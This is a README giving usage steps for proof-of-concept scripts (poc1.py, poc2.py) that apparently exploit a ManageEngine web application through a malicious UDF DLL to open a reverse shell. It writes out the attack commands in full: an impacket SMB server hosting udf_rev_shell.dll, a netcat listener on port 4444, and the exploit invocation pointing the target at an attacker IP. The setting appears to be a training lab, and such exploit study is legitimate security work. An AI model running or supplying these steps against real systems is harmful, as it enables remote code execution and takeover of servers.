# UDF Reverse Shell

## How to use

### poc1.py
1. Start a SMB server and host a share (_test_) in the same directory as the `udf_rev_shell.dll` file:
```bash
impacket-smbserver -smb2support test .
```

3. Start a netcat listener:
```bash
nc -lnvp 4444
```

3. Run the proof of concept (poc1.py) using Python2 and specify the target ManageEngine web application and listener parameters:
```bash
python2 poc1.py https://manageengine:8443 192.168.45.211 4444
```


### poc2.py
1. Start a netcat listener:
```bash
nc -lnvp 4444
```

2. Run the proof of concept (poc2.py) using Python2 and specify the target ManageEngine web application and listener parameters. Ensure that the `udf_rev_shell.dll` file is in the same workign directory as `poc2.py`:
```bash
python2 poc2.py https://manageengine:8443 192.168.45.211 4444
```
